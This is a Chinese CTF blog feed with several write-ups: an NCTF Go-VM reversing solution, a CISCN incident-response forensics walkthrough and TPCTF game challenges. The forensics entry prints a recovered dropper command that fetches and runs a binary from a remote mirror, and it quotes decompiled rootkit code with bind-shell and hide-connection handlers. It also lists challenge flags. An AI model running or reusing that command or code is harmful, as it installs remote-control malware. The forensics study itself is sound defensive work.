v73;    &#125;    else    &#123;      v47 = v73;    &#125;    v42[1] = v47;                               // 传递参数    runtime_newproc(v42, v35, v47, mem, v32, v43, v44, v45, v46, v59);// 协程启动    v48 = v74;    for ( i = 0LL; qword_508478 &gt; i; i = v71 )  // 数据发送    &#123;      v68 = 0;      if ( qword_508480 &lt; i + 4 )               // 中间这部分是边界检查        runtime_panicSliceAcap(i, v35, i + 4);      if ( i &gt; i + 4 )        runtime_panicSliceB(i, v35, i + 4);      v71 = i + 4;      v55 = ((i - qword_508480) &gt;&gt; 63) &amp; i;      if ( &amp;v68 != (off_508470 + v55) )        v68 = *(off_508470 + v55);      runtime_chansend1(v48);                   // 发送到第一个通道      v35 = &amp;v68;      runtime_chansend1(v72);                   // 发送到第二个通道      v48 = v74;    &#125;  &#125;  else  &#123;    v81[0] = &amp;RTYPE_string;    v81[1] = &amp;off_478B18;    fmt_Fprintln(off_479218, qword_510000, v81, 1, 1, v28, v29, p_string, v27, v58, v63);  &#125;  v69 = 0;  runtime_chanrecv1(v76, &amp;v69);                 // 接受第一个结果  v67 = v69;  v69 = 0;  runtime_chanrecv1(v76, &amp;v69);                 // 接受第二个结果  v54 = v69;  v69 = v67;  if ( v67 )    v69 = v54;  if ( v69 )  &#123;    v80[0] = &amp;RTYPE_string;    v80[1] = &amp;off_478B28;                       // correct    fmt_Fprintln(off_479218, qword_510000, v80, 1, 1, v50, v51, v52, v53, v60, v63);  &#125;  else  &#123;    v79[0] = &amp;RTYPE_string;                     // wrong    v79[1] = &amp;off_478B38;    fmt_Fprintln(off_479218, qword_510000, v79, 1, 1, v50, v51, v52, v53, v60, v63);  &#125;&#125;</code></pre><p>代码具体意思已经注释在代码中了</p><p>并且程序把每种运算的函数指令啥的都已经给出来了</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250325175056734.png" alt="image-20250325175056734"></p><p>这里要注意的是，flag字符串被分成两部分，两部分加密的算法虽然都是xxtea，但是具体有些细节不一样。</p><p>那么我们就可以在每个运算函数打下断点，然后当调用该函数的时候，读取响应寄存器的值，将寄存器种的值输出，并且以该运算对应的格式输出。</p><pre><code class="language-python">base = 0x380000def set_python_bpt(ea, cond):    &#39;&#39;&#39; Set conditional breakpoint with Python function        Usage:        set_python_bpt(0x08000688, &#39;view_regs()&#39;)    &#39;&#39;&#39;    idaapi.add_bpt(ea, 4, BPT_DEFAULT)    bpt = idaapi.bpt_t()    idaapi.get_bpt(ea, bpt)    bpt.elang = &#39;Python&#39;    bpt.condition = cond    idaapi.update_bpt(bpt)def hook_shl():    ebx = idc.get_reg_value(&quot;ebx&quot;)    cl = idc.get_reg_value(&quot;cl&quot;)    val1 = ebx    val2 = cl    print(f&quot;&#123;val1:x&#125; &lt;&lt; &#123;val2:x&#125; = &#123;(val1 &lt;&lt; val2) &amp; 0xFFFFFFFF:x&#125;&quot;)def hook_shr():    ebx = idc.get_reg_value(&quot;ebx&quot;)    cl = idc.get_reg_value(&quot;cl&quot;)    val1 = ebx    val2 = cl    print(f&quot;&#123;val1:x&#125; &gt;&gt; &#123;val2:x&#125; = &#123;(val1 &gt;&gt; val2) &amp; 0xFFFFFFFF:x&#125;&quot;)def hook_add():    edx = idc.get_reg_value(&quot;edx&quot;)    rax = idc.get_reg_value(&quot;rax&quot;)    rbx = idc.get_reg_value(&quot;rbx&quot;)    val1 = edx    val2 = idc.get_wide_dword(rax + rbx * 4)    print(f&quot;&#123;val1:x&#125; + &#123;val2:x&#125; = &#123;(val1 + val2) &amp; 0xFFFFFFFF:x&#125;&quot;)def hook_xor():    edx = idc.get_reg_value(&quot;edx&quot;)    rax = idc.get_reg_value(&quot;rax&quot;)    rbx = idc.get_reg_value(&quot;rbx&quot;)    val1 = edx    val2 = idc.get_wide_dword(rax + rbx * 4)    print(f&quot;&#123;val1:x&#125; ^ &#123;val2:x&#125; = &#123;(val1 ^ val2) &amp; 0xFFFFFFFF:x&#125;&quot;)def hook_sub():    edx = idc.get_reg_value(&quot;edx&quot;)    rax = idc.get_reg_value(&quot;rax&quot;)    rbx = idc.get_reg_value(&quot;rbx&quot;)    val1 = edx    val2 = idc.get_wide_dword(rax + rbx * 4)    print(f&quot;&#123;val1:x&#125; - &#123;val2:x&#125; = &#123;(val1 - val2) &amp; 0xFFFFFFFF:x&#125;&quot;)def hook_mul():    edx = idc.get_reg_value(&quot;edx&quot;)    ebx = idc.get_reg_value(&quot;ebx&quot;)    val1 = edx    val2 = ebx    print(f&quot;&#123;val1:x&#125; * &#123;val2:x&#125; = &#123;(val1 * val2) &amp; 0xFFFFFFFF:x&#125;&quot;)def hook_and():    edx = idc.get_reg_value(&quot;edx&quot;)    rax = idc.get_reg_value(&quot;rax&quot;)    rbx = idc.get_reg_value(&quot;rbx&quot;)    val1 = edx    val2 = idc.get_wide_dword(rax + rbx * 4)    print(f&quot;&#123;val1:x&#125; &amp; &#123;val2:x&#125; = &#123;(val1 &amp; val2) &amp; 0xFFFFFFFF:x&#125;&quot;)set_python_bpt(base + 0x0000000000A8860, &#39;hook_shr()&#39;)set_python_bpt(base + 0x0000000000A8820, &#39;hook_shl()&#39;)set_python_bpt(base + 0x00000000000A871D, &#39;hook_add()&#39;)set_python_bpt(base + 0x00000000000A87DD, &#39;hook_xor()&#39;)set_python_bpt(base + 0x00000000000A875D, &#39;hook_sub()&#39;)set_python_bpt(base + 0x0000000000A87A0, &#39;hook_mul()&#39;)set_python_bpt(base + 0x0000000000A889A, &#39;hook_and()&#39;)print(&#39;ok&#39;)</code></pre><p>这里还有一个点是需要注意基地址要为动态调试的时候程序的基地址，不然不会有输出的。</p><p>在输出窗口拿到输出，仔细分析下来，是两部分字符串加密时混在一起的，需要分开来</p><p>这里展示一部分</p><pre><code>9e37 &lt;&lt; 10 = 9e37000079b9 + 9e370000 = 9e3779b99e37 &lt;&lt; 10 = 9e37000079b9 + 9e370000 = 9e3779b9#   tmp1 = (v[4] &gt;&gt; 5) ^ (v[1] &lt;&lt;2)48474645 &lt;&lt; 2 = 211d191454535251 &gt;&gt; 5 = 2a29a92211d1914 ^ 2a29a92 = 23bf8386#   tmp3 = (v[1] &gt;&gt; 3) ^ (v[4] &lt;&lt; 4)48474645 &gt;&gt; 3 = 908e8c854535251 &lt;&lt; 4 = 45352510908e8c8 ^ 45352510 = 4c3dcdd8#   tmp4 = (v[4] &gt;&gt; 5) ^ (v[1] &lt;&lt;2) + (v[1] &gt;&gt; 3) ^ (v[4] &lt;&lt;4)23bf8386 + 4c3dcdd8 = 6ffd515e#   e = (sum &gt;&gt; 2) &amp; 3;9e3779b9 &gt;&gt; 2 = 278dde6e278dde6e &amp; 3 = 2#   (p &amp; 3) ^ e2 ^ 0 = 2#   (sum ^ v[1])9e3779b9 ^ 48474645 = d6703ffc#   (key[(p&amp;3)^e] ^ z)54535251 ^ a78c0b4f = f3df591e#   (sum^y) + (key[(p&amp;3)^e] ^ z))d6703ffc + f3df591e = ca4f991a#   MX = ((v[4] &gt;&gt; 5) ^ (v[1] &lt;&lt;2) + (v[1] &gt;&gt; 3) ^ (v[4] &lt;&lt; 4)) ^ (sum ^ v[1]) + (key[(p&amp;3)^e] ^ v[4]))6ffd515e ^ ca4f991a = a5b2c844#   z = v[0] += MXa5b2c844 + 44434241 = e9f60a85#   tmp2 = (v[6] &gt;&gt; 2) ^ (v[9] &lt;&lt;5)62615a59 &gt;&gt; 2 = 189856966e6d6c6b &lt;&lt; 5 = cdad8d6018985696 ^ cdad8d60 = d535dbf6#   tmp5 = (v[6] &lt;&lt; 3) ^ (v[9] &gt;&gt; 4)62615a59 &lt;&lt; 3 = 130ad2c86e6d6c6b &gt;&gt; 4 = 6e6d6c6130ad2c8 ^ 6e6d6c6 = 15ec040e#   tmp6 = tmp2 + tmp5#   tmp6 = (v[6] &gt;&gt; 2) ^ (v[9] &lt;&lt; 5) + (v[6] &lt;&lt;3) ^ (v[9] &gt;&gt; 4)d535dbf6 + 15ec040e = eb21e004a78c &lt;&lt; 10 = a78c0000b4f + a78c0000 = a78c0b4f9f1c &lt;&lt; 10 = 9f1c0000#   e = (sum &gt;&gt; 2) &amp; 3;2 &amp; 3 = 29e3779b9 &gt;&gt; 2 = 278dde6e278dde6e &amp; 3 = 22 * 4 = 82 ^ 0 = 28 + 20 = 282 &amp; 3 = 2#   get key[0]f72e + 9f1c0000 = 9f1cf72e2 * 4 = 88 + 20 = 28#   (sum ^ v[6])9e3779b9 ^ 62615a59 = fc5623e0#   (key[( p &amp; 3) ^ e] ^ v[9])6e6d6c6b ^ 9f1cf72e = f1719b45#   (sum ^ y) + (key[(p &amp; 3) ^ e] ^ v[9])fc5623e0 + f1719b45 = edc7bf256e63 &lt;&lt; 10 = 6e630000#   MZ2 = ((v[6] &gt;&gt; 2) ^ (v[9] &lt;&lt; 5) + (v[6] &lt;&lt; 3) ^ (v[9] &gt;&gt; 4)) ^ (sum ^ y) + (key[(p &amp; 3) ^ e] ^ v[9])eb21e004 ^ edc7bf25 = 6e65f217466 + 6e630000 = 6e6374663230 &lt;&lt; 10 = 323000003234 + 32300000 = 32303234#   z = v[5] + MZ26e65f21 + 58575655 = 5f3db576</code></pre><p>key也就在输出中根据逻辑找到的</p><p>以下是解密脚本</p><p>exp1</p><pre><code class="language-c">#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;#define DELTA 0x9e3779b9#define MX1 (((z&gt;&gt;5^y&lt;&lt;2) + (y&gt;&gt;3^z&lt;&lt;4)) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z)))void btea(uint32_t *v, int n, uint32_t *key)&#123;    uint32_t y, z, sum;    unsigned p, rounds, e;    if (n &gt; 1)            /* Coding Part */    &#123;        rounds = 6 + 52/n;                sum = 0;        z = v[n-1];        do        &#123;            sum += DELTA;            e = (sum &gt;&gt; 2) &amp; 3;            for (p=0; p&lt;n-1; p++)            &#123;                y = v[p+1];                //printf(&quot;%x \n&quot;, (p&amp;3)^e);                //printf(&quot;%x \n&quot;, MX1);                z = v[p] += MX1;                //printf(&quot;%x &quot;, z);                            &#125;            y = v[0];            z = v[n-1] += MX1;        &#125;        while (--rounds);    &#125;    else if (n &lt; -1)      /* Decoding Part */    &#123;        n = -n;        rounds = 6 + 52/n;        sum = rounds*DELTA;        //printf(&quot;%d\n&quot;,rounds);        y = v[0];        do        &#123;            e = (sum &gt;&gt; 2) &amp; 3;            for (p=n-1; p&gt;0; p--)            &#123;                z = v[p-1];                y = v[p] -= MX1;            &#125;            z = v[n-1];            y = v[0] -= MX1;            sum -= DELTA;        &#125;        while (--rounds);    &#125;&#125;unsigned char cipher[]=&#123;    0x5D, 0x45, 0xD5, 0xB9, 0x8C, 0x95, 0x9C, 0x38, 0x3B, 0xB1, 0x3E, 0x1E, 0x5F, 0xC8, 0xE8, 0xBB, 0x64, 0x38, 0x48, 0x69&#125;;int main()&#123;    uint32_t *v = (uint32_t*)cipher;         uint32_t k[4]= &#123;0x6e637466,0x62ef0ed,0xa78c0b4f,0x32303234&#125;;    int n= 5;     btea(v, -n, k);    unsigned char a;        for(int i = 0; i &lt; 5; i++) &#123;            //printf(&quot;%x &quot;, v[i]);        &#125;    for(int i=0;i&lt;32;i++)    &#123;            printf(&quot;%c&quot;, cipher[i]);        &#125;                //NCTF&#123;H4rd_VM_with_Go    return 0;&#125;</code></pre><p>exp2</p><pre><code class="language-c">#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;#define DELTA 0x9e3779b9#define MX1 (((z&lt;&lt;5^y&gt;&gt;2) + (y&lt;&lt;3^z&gt;&gt;4)) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z)))void btea(uint32_t *v, int n, uint32_t *key)&#123;    uint32_t y, z, sum;    unsigned p, rounds, e;    if (n &gt; 1)            /* Coding Part */    &#123;        rounds = 6 + 52/n;                sum = 0;        z = v[n-1];        do        &#123;            sum += DELTA;            e = (sum &gt;&gt; 2) &amp; 3;            for (p=0; p&lt;n-1; p++)            &#123;                y = v[p+1];                //printf(&quot;%x \n&quot;, (p&amp;3)^e);                //printf(&quot;%x \n&quot;, MX1);                z = v[p] += MX1;                //printf(&quot;%x &quot;, z);            &#125;            y = v[0];            z = v[n-1] += MX1;        &#125;        while (--rounds);    &#125;    else if (n &lt; -1)      /* Decoding Part */    &#123;        n = -n;        rounds = 6 + 52/n;        sum = rounds*DELTA;        //printf(&quot;%d\n&quot;,rounds);        y = v[0];        do        &#123;            e = (sum &gt;&gt; 2) &amp; 3;            for (p=n-1; p&gt;0; p--)            &#123;                z = v[p-1];                y = v[p] -= MX1;            &#125;            z = v[n-1];            y = v[0] -= MX1;            sum -= DELTA;        &#125;        while (--rounds);    &#125;&#125;unsigned char cipher[] = &#123;    0xDE, 0x81, 0xD8, 0xAD, 0xC2, 0xC4, 0xA6, 0x32, 0x1C, 0xAB,    0x61, 0x3E, 0xCB, 0xFF, 0xEF, 0xF1, 0x27, 0x30, 0x7A, 0x16&#125;;int main()&#123;    uint32_t *v = (uint32_t*)cipher;        uint32_t k[4] = &#123;0x32303234, 0xd6eb12c3, 0x9f1cf72e, 0x4e435446&#125;;    int n = 5;    btea(v, -n, k);    unsigned char a;        for(int i = 0; i &lt; 5; i++) &#123;        //printf(&quot;%x &quot;, v[i]);    &#125;    for(int i = 0; i &lt; 20; i++)    &#123;        printf(&quot;%c&quot;, cipher[i]);    &#125;    //r0ut1n3_5fc4b0be7ad&#125;    return 0;&#125;</code></pre><p><strong>NCTF{H4rd_VM_with_Gor0ut1n3_5fc4b0be7ad}</strong></p><p>本题是参照0psu3战队的wp复现的。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> RE </tag>
            
            <tag> WritesUp </tag>
            
            <tag> vm </tag>
            
            <tag> go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CISCN x CCB 半决赛 2025 ISW(应急响应)</title>
      <link href="/2025/03/18/CISCN%20x%20CCB%20%E5%8D%8A%E5%86%B3%E8%B5%9B%202025%20ISW(%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94)/"/>
      <url>/2025/03/18/CISCN%20x%20CCB%20%E5%8D%8A%E5%86%B3%E8%B5%9B%202025%20ISW(%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94)/</url>
      
        <content type="html"><![CDATA[<h1 id="CISCN-x-CCB-半决赛-2025-ISW-应急响应"><a href="#CISCN-x-CCB-半决赛-2025-ISW-应急响应" class="headerlink" title="CISCN x CCB 半决赛 2025 ISW(应急响应)"></a>CISCN x CCB 半决赛 2025 ISW(应急响应)</h1><p>第一次入围CISCN半决赛，学了一周应急匆忙上阵，上午awdp坐牢四小时，下午应急也坐牢四小时，狠狠爆零，log目录翻烂了都没找到IP，还得练。</p><p>不知道附件中的入口主机dd镜像.raw有啥用，赛后看了其他队伍的wp才知道可以根据这玩意进行恢复取证分析。</p><h3 id="题目背景"><a href="#题目背景" class="headerlink" title="题目背景"></a>题目背景</h3><blockquote><p>⼩路是⼀名⽹络安全⽹管，据反映发现公司主机上有异常外联信息，据回忆前段时间执⾏过 某些更新脚本（已删除），现在需要协助⼩路同学进⾏⽹络安全应急响应分析，查找⽊⻢， 进⼀步分析，寻找攻击源头，获取攻击者主机权限获取flag⽂件。</p></blockquote><h3 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h3><blockquote><p>题目描述</p><p>找出主机上**⽊⻢回连**的主控端服务器IP地址（不定时(3~5分钟)周期性），并以 <strong>flag{MD5}</strong>  形式提交，其中MD5加密⽬标的原始字符串格式 <strong>IP:port</strong></p></blockquote><p>使用取证工具：<strong>RStudioPortable</strong></p><p>工具打开之后，扫描文件所在盘，扫描完成之后，可以看到</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250318095417900.png" alt="image-20250318095417900"></p><p>其中Recognized就是工具扫描识别出的分区，找到对应的分区，看到</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250318095519119.png" alt="image-20250318095519119"></p><p>首先查看靶机给的Ubuntu用户，raw目录</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250318095712206.png" alt="image-20250318095712206"></p><p>发现一个可疑且被删除的文件，<strong>1.txt</strong>，恢复提取查看</p><pre><code>wget –quiet http://mirror.unknownrepo.net/f/l/a/g/system_upgrade -O /tmp/.system_upgrade &amp;&amp; chmod +x /tmp/.system_upgrade &amp;&amp; /tmp/.system_upgrade</code></pre><p>有可能时黑客下载病毒文件时所执行的命令，同时在本目录还看到可疑文件**.viminfo**</p><blockquote><p><strong>Viminfo</strong>⽂件是Vim编辑器中的⼀个重要⽂件，⽤于保存⽤⼾在退出Vim时的各种状态信 息，以便在⽤⼾再次启动Vim时能够快速恢复这些状态</p></blockquote><p>恢复提取查看</p><p>在其中看到了和下载的文件名相同的服务</p><pre><code># Jumplist (newest first):-&#39;  6  0  /etc/systemd/system/system-upgrade.service|4,39,6,0,1740374317,&quot;/etc/systemd/system/system-upgrade.service&quot;-&#39;  6  0  /etc/systemd/system/system-upgrade.service|4,39,6,0,1740374161,&quot;/etc/systemd/system/system-upgrade.service&quot;-&#39;  5  7  /etc/systemd/system/system-upgrade.service|4,39,5,7,1740374156,&quot;/etc/systemd/system/system-upgrade.service&quot;-&#39;  5  7  /etc/systemd/system/system-upgrade.service|4,39,5,7,1740374156,&quot;/etc/systemd/system/system-upgrade.service&quot;-&#39;  5  7  /etc/systemd/system/system-upgrade.service|4,39,5,7,1740374151,&quot;/etc/systemd/system/system-upgrade.service&quot;-&#39;  1  0  /etc/systemd/system/system-upgrade.service|4,39,1,0,1740374113,&quot;/etc/systemd/system/system-upgrade.service&quot;-&#39;  1  0  /etc/systemd/system/system-upgrade.service|4,39,1,0,1740374113,&quot;/etc/systemd/system/system-upgrade.service&quot;-&#39;  1  0  /etc/systemd/system/system-upgrade.service|4,39,1,0,1740374113,&quot;/etc/systemd/system/system-upgrade.service&quot;</code></pre><p>找到该服务</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250318100355212.png" alt="image-20250318100355212"></p><p>右键预览</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250318100428169.png" alt="image-20250318100428169"></p><p>可以看到该服务所启动的程序，找到恢复提取，然后用ida反编译</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250318100600123.png" alt="image-20250318100600123"></p><p>发现对符号表进行了混淆</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250318100700135.png" alt="image-20250318100700135"></p><p>但依旧可以通过字符串找到主函数</p><pre><code class="language-c">__int64 ULRYvXzICzy880dO()&#123;  _fentry__();  Cr8YeLCPy17g2Kqp();  vH5iRF4rBcsPSxfk();  QODpPLbPPLRtk397();  ZRzAVZZOp3EIPba6(&amp;unk_2720);  XnzbhEaPnydxn1rY(&quot;HIDEME&quot;, ZRzAVZZOp3EIPba6);  XnzbhEaPnydxn1rY(&quot;SHOWME&quot;, bbiVzCN8llELLp6o);  XnzbhEaPnydxn1rY(&quot;HIDE_DENT&quot;, Fmk3MFLuFCEiNxgN);  XnzbhEaPnydxn1rY(&quot;SHOW_HIDDEN_DENT&quot;, PiCa2rGqFOVs1eiB);  XnzbhEaPnydxn1rY(&quot;HIDE_TCP_PORT&quot;, IDZO4NzptW8GaHzj);  XnzbhEaPnydxn1rY(&quot;SHOW_HIDDEN_TCP_PORT&quot;, ol186ifyeUPhXKNl);  XnzbhEaPnydxn1rY(&quot;HIDE_TCP_IP&quot;, H7XMCPIhJup38DuP);  XnzbhEaPnydxn1rY(&quot;SHOW_HIDDEN_TCP_IP&quot;, yiA2lg0kW8v2vOp0);  XnzbhEaPnydxn1rY(&quot;HIDE_UDP_PORT&quot;, cuC5zWc4iL4kPgAn);  XnzbhEaPnydxn1rY(&quot;SHOW_HIDDEN_UDP_PORT&quot;, LC22j9OZfANw81M7);  XnzbhEaPnydxn1rY(&quot;HIDE_UDP_IP&quot;, YlfqRhWLKVqMFbxN);  XnzbhEaPnydxn1rY(&quot;SHOW_HIDDEN_UDP_IP&quot;, XBKrkXaghfenXrk6);  XnzbhEaPnydxn1rY(&quot;BINDSHELL_CREATE&quot;, NVEKPqx35kIvfacV);  XnzbhEaPnydxn1rY(&quot;RUN_CUSTOM_BASH&quot;, T34Z94ahif0BXQRk);  Fmk3MFLuFCEiNxgN(&quot;systemd-agentd&quot;);  Fmk3MFLuFCEiNxgN(&quot;system-upgrade&quot;);  Fmk3MFLuFCEiNxgN(&quot;system_upgrade&quot;);  IDZO4NzptW8GaHzj(&quot;4948&quot;);  IDZO4NzptW8GaHzj(&quot;1337&quot;);  H7XMCPIhJup38DuP(&quot;192.168.57.203&quot;);  H7XMCPIhJup38DuP(&quot;127.0.0.1&quot;);  cuC5zWc4iL4kPgAn(&quot;8080&quot;);  return YlfqRhWLKVqMFbxN(&quot;127.0.0.1&quot;);&#125;</code></pre><p>找到了IP和port</p><p><strong>flag{MD5(192.168.57.203:4948)}</strong></p><hr><h3 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h3><blockquote><p>找出主机上驻留的<strong>远控⽊⻢⽂件本体</strong>，计算该⽂件的MD5,结果提交形式： flag{md5}</p></blockquote><p>在第一题中ida反编译的结果中就可以找到木马本体</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250318101029728.png" alt="image-20250318101029728"></p><p>导出计算文件md5即可</p><p><strong>flag{bccad26b665ca175cd02aca2903d8b1e}</strong></p><hr><h3 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h3><blockquote><p>找出主机上加载远控⽊⻢的<strong>持久化程序</strong>（下载者），其功能为下载并执⾏远控⽊⻢，计算该 ⽂件的MD5,结果提交形式： flag{MD5}</p></blockquote><p>这个持久化程序就是我们之前找到的那个服务</p><p><strong>flag{fabe3a89369c56609d2748e5890b21d7}</strong></p><hr><h3 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h3><blockquote><p>查找题⽬3中持久化程序（下载者）的<strong>植⼊痕迹</strong>，计算持久化程序植⼊时的原始名称MD5 （仅计算⽂件名称字符串MD5），并提交对应 flag{MD5}</p></blockquote><p>持久化程序的植入痕迹也就是我们在最开始的1.txt中看到的下载指令中的<strong>system_upgrade</strong></p><p><strong>flag{MD(system_upgrade)}</strong></p><hr><h3 id="flag5"><a href="#flag5" class="headerlink" title="flag5"></a>flag5</h3><blockquote><p>分析题⽬2中找到的远控⽊⻢，获取⽊⻢通信加密密钥,结果提交形式：flag{ 通信加密 钥 } </p></blockquote><p>将题目2中得到的文件用ida分析，很显然去符号了，但是依旧可以通过可疑的数组进行定位(这对逆向手不是一眼盯真)</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250318102105359.png" alt="image-20250318102105359"></p><p>交叉引用找到引用函数</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250318102141618.png" alt="image-20250318102141618"></p><p>就是一个异或</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250318102231539.png" alt="image-20250318102231539"></p><p><strong>flag{ThIS_1S_th3_S3cR3t_fl@g}</strong></p><hr><h3 id="flag6"><a href="#flag6" class="headerlink" title="flag6"></a>flag6</h3><blockquote><p>分析题⽬3中持久化程序（下载者），找到攻击者分发远控⽊⻢使⽤的服务器，并获取该服 务器权限，找到flag，结果提交形式： flag{xxxx} </p></blockquote><p>未能复现，只能等后期看会不会在一些靶场重新上线吧</p><hr><h3 id="flag7"><a href="#flag7" class="headerlink" title="flag7"></a>flag7</h3><blockquote><p>获取题⽬2中找到的远控⽊⻢的主控端服务器权限，查找flag⽂件，结果提交形式： flag{xxxxx}</p></blockquote><p>同上</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ISW </tag>
            
            <tag> 应急响应 </tag>
            
            <tag> 取证 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TPCTF 2025</title>
      <link href="/2025/03/11/TPCTF%202025/"/>
      <url>/2025/03/11/TPCTF%202025/</url>
      
        <content type="html"><![CDATA[<h1 id="TPCTF-2025"><a href="#TPCTF-2025" class="headerlink" title="TPCTF 2025"></a>TPCTF 2025</h1><h3 id="chase"><a href="#chase" class="headerlink" title="chase"></a>chase</h3><p>一道nes游戏题，刚开始尝试反编译，然后拿到asm文件，但是数量太大，并且逻辑抽象，用Ghidra能反编译一些，但是逻辑感觉完全无用，就只能选择游戏作弊通关拿flag这条路了，用的模拟器是Fceus64模拟器，一些基本的用法详见文章<a href="https://zhuanlan.zhihu.com/p/184862425">https://zhuanlan.zhihu.com/p/184862425</a></p><p>直接修改关卡目标分数，全部改成0，该分数地址在0x83，当前分数在0x84，通关之后拿到第一部分flag</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/fc33a2f0519be663231dbb9c20950e5.png" alt="fc33a2f0519be663231dbb9c20950e5"></p><p><strong>TPCTF{D0_Y0U_L1KE_</strong></p><p>然后在Debug选项中点击PPU Viewer，可以找到第三部分的flag</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250309132713692.png" alt="image-20250309132713692"></p><p><strong>ON_Y0UR_N3S?}</strong></p><blockquote><p>PPU Viewer用于查看PPU内存中的图案表（Pattern Tables）、名称表（Name Tables）等图形数据。那么按道理应该pt2的flag也会在这里看到，看不到的原因可能是因为被黑色覆盖掉了，所以我们可以先找到pt1的地址，然后将pt2的内容覆盖到pt1上进行显示。</p></blockquote><p>然后我们在PPU Viewer窗口，当我们的光标放在某个字符上时，下方会显示例如，放在F上，Title：$26</p><blockquote><p>在PPU Viewer中，“Title: $26”主要用于标识PPU内存中的特定图形数据区域，帮助开发者调试和管理图形资源。</p></blockquote><p>然后我们找到FLAG分别对应的值</p><p><strong>F: 26 L: 2C A: 21 G: 27</strong></p><p>010editor打开进行搜索，找到两部分</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250309133453869.png" alt="image-20250309133453869"></p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250309133520772.png" alt="image-20250309133520772"></p><p>将这两部分数据进行替换位置，然后保存玩通关就有pt2了</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250309135006583.png" alt="image-20250309135006583"></p><p><strong>PLAY1N9_6@M3S_</strong></p><p>拿到flag：<strong>TPCTF{D0_Y0U_L1KE_PLAY1N9_6@M3S_ON_Y0UR_N3S?}</strong></p><hr><h3 id="portable"><a href="#portable" class="headerlink" title="portable"></a>portable</h3><p>这题应该是全场re最简单的题了，就是一个异或，ida64打开，程序主逻辑在sub_407F30函数，</p><p>检查flag长度</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250309142059081.png" alt="image-20250309142059081"></p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250309142420270.png" alt="image-20250309142420270"></p><p>动调跟着这个函数完整的走了一圈下来，发现应该就是这个异或，然后赛博厨子直接出，没写脚本，写脚本的时候发现后半部分不可见，应该因为不是英文的原因吧</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/6b43afc54631106daa3e4b398d40793.png" alt="6b43afc54631106daa3e4b398d40793"></p><p>拿到flag</p><hr><h3 id="stone-game"><a href="#stone-game" class="headerlink" title="stone_game"></a>stone_game</h3><p>ios，是python写的，依旧使用<strong>pyinstxtractor.py</strong>解包，然后分析里面的主函数逻辑和库函数，主函数所在的pyd可以用这个网站进行反编译<a href="https://pylingual.io/%EF%BC%8C%E4%BD%86%E6%98%AF%E5%BA%93%E5%87%BD%E6%95%B0%E4%B8%8D%E8%A1%8C%EF%BC%8C%E4%BD%86%E4%B9%9F%E5%A5%BD%E5%9C%A8%E8%BF%99%E4%B8%AA%E9%A2%98%E5%92%8Cpython%E9%80%86%E5%90%91%E6%B2%A1%E5%A4%9A%E5%A4%A7%E5%85%B3%E7%B3%BB%EF%BC%8C%E4%B8%BB%E8%A6%81%E8%BF%98%E6%98%AF%E7%8E%A9%E6%B8%B8%E6%88%8F%E9%80%9A%E5%85%B3%EF%BC%8C%E5%B0%B1%E6%98%AF%E7%A7%BB%E7%9F%B3%E5%A4%B4%E7%9A%84%E7%9B%8A%E6%99%BA%E6%B8%B8%E6%88%8F%EF%BC%8C%E6%A0%B9%E6%8D%AE%E6%B5%8B%E8%AF%95%EF%BC%8C%E4%B8%80%E6%AC%A1%E6%9C%80%E5%A4%9A%E5%8F%AA%E8%83%BD%E4%B8%80%E5%8F%A3%E6%B0%94%E7%A7%BB%E5%AE%8C%E5%9B%9B%E5%A0%86%E7%9F%B3%E5%A4%B4%EF%BC%8C%E5%90%A6%E5%88%99%E5%B0%B1%E4%BC%9A%E6%8A%A5%E9%94%99%EF%BC%8C%E7%84%B6%E5%90%8E%E8%A6%81%E8%B5%A2100%E8%BD%AE%EF%BC%8C%E5%8F%AF%E4%BB%A5%E6%89%8B%E6%90%93%E4%B9%9F%E5%8F%AF%E4%BB%A5pwntools%E5%86%99%E8%84%9A%E6%9C%AC%E8%87%AA%E5%8A%A8%E5%8C%96%E5%8E%BB%E6%89%93%EF%BC%8C%E4%BD%86%E6%98%AF%E4%B9%9F%E5%BE%97%E6%89%BE%E5%88%B0%E4%B8%80%E4%B8%AA%E9%80%9A%E6%9D%80%E4%B8%94%E6%AD%A5%E9%AA%A4%E4%B8%8D%E5%A4%8D